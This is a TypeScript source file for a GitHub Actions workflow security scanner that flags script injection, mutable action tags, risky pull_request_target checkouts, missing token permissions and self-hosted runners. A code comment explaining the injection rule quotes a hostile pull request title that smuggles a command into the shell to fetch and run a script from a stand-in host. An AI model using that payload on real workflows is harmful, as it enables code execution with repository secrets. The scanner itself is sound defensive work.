import type { Scanner, ScanContext } from "../scanner"
import type { Issue } from "../schema"

/**
 * Workflow Security scanner ⭐.
 *
 * Reads GitHub Actions workflows and reports the ways one lets a stranger reach
 * your secrets or your repository. Not style, not hygiene: every rule here has a
 * published incident behind it.
 *
 * Why a repository scanner cares about CI at all — the workflow file is the part
 * of a project with the highest privilege and the least review. It holds a token
 * that can push, it can read every secret, and it runs automatically on events
 * that outsiders trigger. A `.github/workflows/*.yml` is production code with a
 * credential attached, and it is normally the file nobody reads twice.
 *
 * ## Parsed with a line scanner, not a YAML library
 *
 * Deliberate. A parser would bring a dependency into a project that grades other
 * projects on dependency weight, and it would buy little: every rule below is
 * about the presence or absence of a line, and the findings must point at a line
 * number a person can open. The cost is honest — deeply unusual formatting (flow
 * mappings, folded scalars) is read conservatively, and when this scanner is not
 * sure it says nothing. A missed finding is a bad day; a false one wastes an
 * afternoon and teaches people to ignore the tool.
 */

const WORKFLOW_RE = /^\.github\/workflows\/[^/]+\.ya?ml$/i

/** Cap so a repository with dozens of workflows cannot flood a report. */
const MAX_ISSUES = 40

/**
 * Actions published by GitHub itself. Still worth pinning, but a compromise of
 * `actions/checkout` is a different kind of event from a compromise of a
 * one-maintainer action, so they are reported at a lower severity rather than
 * not at all.
 */
const FIRST_PARTY = /^(?:actions|github|docker)\//i

/** A 40-character hex sha — the only immutable way to reference an action. */
const SHA_RE = /^[0-9a-f]{40}$/i

/**
 * Contexts an outsider controls, which therefore must never be interpolated
 * into a shell command.
 *
 * A pull request title of `"; curl evil.sh | sh #` becomes shell when GitHub
 * substitutes `${{ github.event.pull_request.title }}` into a `run:` block —
 * substitution happens before the shell ever sees the script, so quoting in the
 * workflow does not save you. The fix is to pass it through `env:` and reference
 * `"$TITLE"`, where the shell treats it as data.
 */
const INJECTABLE = [
  "github.event.issue.title",
  "github.event.issue.body",
  "github.event.pull_request.title",
  "github.event.pull_request.body",
  "github.event.comment.body",
  "github.event.review.body",
  "github.event.review_comment.body",
  "github.event.head_commit.message",
  "github.event.commits",
  "github.event.pull_request.head.ref",
  "github.event.pull_request.head.label",
  "github.head_ref",
]

export interface WorkflowFinding {
  rule: string
  line: number
  evidence: string
}

/** Indentation depth, treating a tab as one level. */
function indentOf(line: string): number {
  const match = line.match(/^[ \t]*/)
  return match ? match[0].length : 0
}

/** Strip a trailing `# comment`, which is never part of a value we judge. */
function withoutComment(line: string): string {
  // Only when the # starts a word — `image: node:20 # pinned` yes, `a#b` no.
  return line.replace(/\s+#.*$/, "")
}

/**
 * Find every rule violation in one workflow file.
 *
 * Exported for tests: the rules are the whole product here, and each one earns
 * a case with a realistic workflow rather than a synthetic line.
 */
export function scanWorkflow(content: string): WorkflowFinding[] {
  const lines = content.split(/\r?\n/)
  const findings: WorkflowFinding[] = []

  let hasTopLevelPermissions = false
  let usesPullRequestTarget = false
  let checksOutPrHead = -1
  let sawJobs = false

  // `run:` blocks are block scalars; we track when we are inside one so a
  // `${{ }}` on a continuation line is still attributed to the run step.
  let runIndent = -1

  for (let i = 0; i < lines.length; i++) {
    const raw = lines[i]
    const line = withoutComment(raw)
    const trimmed = line.trim()
    if (!trimmed) continue
    const indent = indentOf(line)
    const at = i + 1

    if (/^jobs\s*:/.test(trimmed) && indent === 0) sawJobs = true

    // Top-level `permissions:` — indentation zero, before `jobs:`. A job-level
    // one is good practice too, but only the top-level key changes the default
    // for every job, which is the thing that is `write-all` on older repos.
    if (indent === 0 && /^permissions\s*:/.test(trimmed)) hasTopLevelPermissions = true

    // The dangerous trigger. `pull_request_target` runs with the BASE
    // repository's secrets and a write token, by design, so that labelling bots
    // work on forks. Combined with checking out the pull request's own code it
    // means a stranger's code runs with your credentials.
    if (/\bpull_request_target\b/.test(trimmed)) usesPullRequestTarget = true

    if (/^-?\s*ref\s*:/.test(trimmed) && /github\.event\.pull_request\.head|github\.head_ref/.test(trimmed)) {
      checksOutPrHead = at
    }

    // ---- uses: — action pinning -------------------------------------------
    const uses = trimmed.match(/^-?\s*uses\s*:\s*['"]?([^'"\s]+)['"]?/)
    if (uses) {
      const ref = uses[1]
      // Local (`./.github/actions/x`) and container (`docker://`) references are
      // not fetched from a third party, so pinning does not apply.
      if (!ref.startsWith("./") && !ref.startsWith("docker://")) {
        const atIdx = ref.lastIndexOf("@")
        const version = atIdx === -1 ? "" : ref.slice(atIdx + 1)
        const name = atIdx === -1 ? ref : ref.slice(0, atIdx)
        if (!version) {
          findings.push({ rule: "action-unpinned", line: at, evidence: trimmed })
        } else if (!SHA_RE.test(version)) {
          findings.push({
            rule: FIRST_PARTY.test(name) ? "action-tag-first-party" : "action-tag",
            line: at,
            evidence: trimmed,
          })
        }
      }
    }

    // ---- self-hosted runners ----------------------------------------------
    if (/^runs-on\s*:/.test(trimmed) && /self-hosted/.test(trimmed)) {
      findings.push({ rule: "self-hosted-runner", line: at, evidence: trimmed })
    }

    // ---- script injection --------------------------------------------------
    if (/^-?\s*run\s*:/.test(trimmed)) runIndent = indent
    else if (runIndent >= 0 && indent <= runIndent && /^[a-z_-]+\s*:/i.test(trimmed)) runIndent = -1

    if (runIndent >= 0 && trimmed.includes("${{")) {
      const hit = INJECTABLE.find((ctx) => line.includes(ctx))
      if (hit) {
        findings.push({ rule: "script-injection", line: at, evidence: trimmed })
      }
    }
  }

  if (usesPullRequestTarget && checksOutPrHead !== -1) {
    findings.push({
      rule: "pr-target-checkout",
      line: checksOutPrHead,
      evidence: lines[checksOutPrHead - 1]?.trim() ?? "",
    })
  }

  // Only meaningful for a file that actually defines jobs. A reusable workflow
  // fragment or an issue-template yaml that happens to live here is not one.
  if (sawJobs && !hasTopLevelPermissions) {
    findings.push({ rule: "no-permissions", line: 1, evidence: "" })
  }

  return findings
}

interface RuleSpec {
  severity: Issue["severity"]
  title: (evidence: string) => string
  detail: string
}

const RULES: Record<string, RuleSpec> = {
  "pr-target-checkout": {
    severity: "critical",
    title: () => "pull_request_target checks out the pull request's own code",
    detail:
      "`pull_request_target` runs with the base repository's secrets and a write token — that is its purpose, so bots can label forks. Checking out the pull request's head means a stranger's code executes with those credentials: anyone who can open a pull request can read every secret and push to the repository. Either use `pull_request` (no secrets, no write token), or keep `pull_request_target` and do not check out or execute the contributed code.",
  },
  "script-injection": {
    severity: "critical",
    title: () => "Attacker-controlled text interpolated into a shell command",
    detail:
      "GitHub substitutes `${{ … }}` into the script BEFORE the shell runs, so quoting in the workflow does not help. A pull request title or branch name containing shell metacharacters becomes commands running with this job's token. Pass the value through `env:` and reference it as \"$VAR\", where the shell treats it as data rather than as code.",
  },
  "action-unpinned": {
    severity: "warning",
    title: (e) => `Action used with no version at all: ${actionName(e)}`,
    detail:
      "With no `@ref` the action's default branch is used, so whatever is on that branch today runs with this job's token and secrets. Pin to a commit sha.",
  },
  "action-tag": {
    severity: "warning",
    title: (e) => `Third-party action pinned to a mutable tag: ${actionName(e)}`,
    detail:
      "A tag can be moved. Whoever controls that action's repository — or anyone who compromises the maintainer's account — can point it at new code, which then runs with this job's token and secrets. This is not hypothetical: the tj-actions/changed-files compromise in March 2025 rewrote tags across thousands of repositories to leak CI secrets. Pin to a full commit sha and let Dependabot raise the updates.",
  },
  "action-tag-first-party": {
    severity: "info",
    title: (e) => `Action pinned to a mutable tag: ${actionName(e)}`,
    detail:
      "GitHub's own actions can move their tags too, though a compromise there is a very different event from a one-maintainer action. Pinning to a commit sha makes the workflow reproducible either way.",
  },
  "no-permissions": {
    severity: "warning",
    title: () => "Workflow does not restrict the GITHUB_TOKEN's permissions",
    detail:
      "With no top-level `permissions:` block the token gets the repository's default, which on repositories created before 2023 is read AND write to everything. Any compromised step — a dependency's install script, a third-party action — inherits that. Add `permissions: contents: read` at the top and grant more only to the jobs that need it.",
  },
  "self-hosted-runner": {
    severity: "warning",
    title: () => "Self-hosted runner",
    detail:
      "A self-hosted runner keeps state between jobs and sits inside your network. On a public repository, a fork's pull request can run on it, which turns a CI job into code execution on your own infrastructure. Make sure this workflow cannot be triggered by outsiders, or move it to a hosted runner.",
  },
}

/** `uses: owner/action@v4` → `owner/action`, for a title worth reading. */
function actionName(evidence: string): string {
  const match = evidence.match(/uses\s*:\s*['"]?([^'"\s@]+)/)
  return match ? match[1] : "action"
}

export const workflowSecurityScanner: Scanner = {
  id: "workflow-security",
  category: "security",

  async run(ctx: ScanContext): Promise<Issue[]> {
    const workflows = ctx.files.filter((f) => WORKFLOW_RE.test(f.replace(/\\/g, "/")))
    if (workflows.length === 0) return []

    const issues: Issue[] = []

    for (const file of workflows) {
      if (issues.length >= MAX_ISSUES) break
      const content = await ctx.readFile(file)
      if (!content) continue

      for (const finding of scanWorkflow(content)) {
        if (issues.length >= MAX_ISSUES) break
        const rule = RULES[finding.rule]
        if (!rule) continue

        let ageDays = 0
        try {
          ageDays = await ctx.git.blameAgeDays(file, finding.line)
        } catch {
          /* blame is a nicety; a finding without an age is still a finding */
        }

        issues.push({
          id: `${finding.rule}-${file}-${finding.line}`,
          category: "security",
          severity: rule.severity,
          title: rule.title(finding.evidence),
          location: `${file}:${finding.line}`,
          ageDays,
          detail: rule.detail,
          ...(finding.evidence ? { evidence: finding.evidence.slice(0, 200) } : {}),
        })
      }
    }

    return issues
  },
}
